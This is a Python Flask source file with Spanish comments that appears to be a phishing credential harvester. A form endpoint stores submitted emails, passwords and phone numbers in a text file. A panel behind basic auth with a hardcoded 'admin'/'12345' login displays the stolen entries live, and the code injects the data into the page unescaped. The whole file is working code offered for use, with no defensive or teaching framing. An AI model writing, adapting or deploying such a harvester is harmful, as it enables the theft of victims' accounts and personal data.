import json
from flask import Flask, request, render_template, render_template_string, Response
from functools import wraps

app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='')

# --- SEGURIDAD: CONFIGURA TU USUARIO Y CLAVE AQUÍ ---
def check_auth(username, password):
    return username == 'admin' and password == '12345' # CAMBIA ESTO POR LO QUE QUIERAS

def authenticate():
    return Response('Acceso Denegado. Credenciales incorrectas.', 401, {'WWW-Authenticate': 'Basic realm="Login Requerido"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated
# ----------------------------------------------------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/guardar', methods=['POST'])
def guardar():
    c = request.form.get('correo')
    p = request.form.get('password')
    t = request.form.get('telefono')
    with open("datos.txt", "a") as f:
        f.write(f"{c}|{p}|{t}\n")
    return "Procesando..."

@app.route('/datos_json')
@requires_auth
def datos_json():
    datos = []
    try:
        with open("datos.txt", "r") as f:
            for linea in f:
                p = linea.strip().split("|")
                if len(p) == 3:
                    datos.append({"correo": p[0], "pass": p[1], "tel": p[2]})
    except: pass
    return json.dumps(datos)

@app.route('/panel')
@requires_auth
def panel():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DATOS EN VIVO</title>
        <style>
            body { background: #0a0a0a; color: white; font-family: sans-serif; padding: 20px; display: flex; flex-direction: column; align-items: center; }
            .contenedor { width: 100%; max-width: 500px; }
            h2 { color: #d4af37; text-align: center; }
            .reloj { text-align: center; font-size: 20px; margin-bottom: 20px; }
            table { width: 100%; border-collapse: collapse; background: #1a1a1a; border: 1px solid #d4af37; }
            th { background: #d4af37; color: black; padding: 10px; font-size: 12px; }
            td { padding: 10px; border-bottom: 1px solid #333; text-align: center; font-size: 13px; }
            .btn { background: #d4af37; color: black; width: 100%; padding: 15px; border: none; font-weight: bold; margin-top: 20px; cursor: pointer; }
            .estado { text-align: center; margin-top: 15px; color: #00ff66; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="contenedor">
            <h2>DATOS EN VIVO</h2>
            <div id="reloj" class="reloj"></div>
            <table>
                <thead><tr><th>#</th><th>CORREO</th><th>CONTRASEÑA</th><th>TELÉFONO</th></tr></thead>
                <tbody id="tabla-body"></tbody>
            </table>
            <button class="btn" onclick="cargarDatos()">ACTUALIZAR DATOS</button>
            <div class="estado">● ESTADO: CONECTADO (FLASK/TERMUX)</div>
        </div>
        <script>
            function updateReloj() { document.getElementById('reloj').innerText = new Date().toLocaleTimeString(); }
            setInterval(updateReloj, 1000);
            function cargarDatos() {
                fetch('/datos_json').then(r => r.json()).then(data => {
                    document.getElementById('tabla-body').innerHTML = data.map((d, i) => `
                        <tr><td>${i+1}</td><td>${d.correo}</td><td>${d.pass}</td><td>${d.tel}</td></tr>
                    `).join('');
                });
            }
            cargarDatos();
        </script>
    </body>
    </html>
    """)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

